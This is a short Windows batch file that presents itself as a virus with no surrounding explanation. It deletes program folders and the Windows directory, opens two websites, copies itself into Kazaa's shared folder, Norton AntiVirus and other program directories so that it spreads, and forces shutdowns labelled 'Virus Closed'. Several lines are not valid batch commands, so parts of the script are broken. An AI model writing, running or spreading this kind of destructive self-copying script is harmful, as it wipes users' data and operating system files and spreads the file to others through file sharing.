   @Echo off
   del C:\Program Files\AIM95
   del C:\Program Files\Database
   del C:\GoldMine
   del C:\Program Files\Adobe\Acrobat 5.0\Reader
   del C:\windows
   del C:\Program Files\Earthlink Total Access
   del C:\Program Files\Netscape\Netscape
   del C:\Program Files\Kazaa
   del C:\Program Files\Windows Messanger
   del C:\Program Files\America Online 7.0
   % Copy %0 C:\My Documents\vbs.bat
   goto Exp

   :Exp
   Start iexplore http://www.BRNS.TK
   Start iexplore http://www.Earmy.TK
   goto thr

   :thr
   Copy %0 C:\Goldmine*
   Copy %0 C:\Program Files\Kazaa\MySharedFolder
   Copy %0 C:\Norton\
   Copy %0 C:\Program Files\Norton AntiVirus\Norton AntiVirus 2002
   Copy %0 C:\Program Files\Sierra\Empire Earth\Empire Earth
   Copy %0 C:\Program Files\Aim95
   SHUTDOWN -s -t 20 -c "20 secs"
   Restart -s -t 5 -c
   autorun %0 C:My Documents\Grief.vbs.bat.ams
   autorun %0 C:Downloads\Grief.vbs.bat.ams
   wait 5 sec %>
   Copy %0 C:\desktop
   SHUTDOWN -s -t 30 -c "Virus Closed"
   CLS
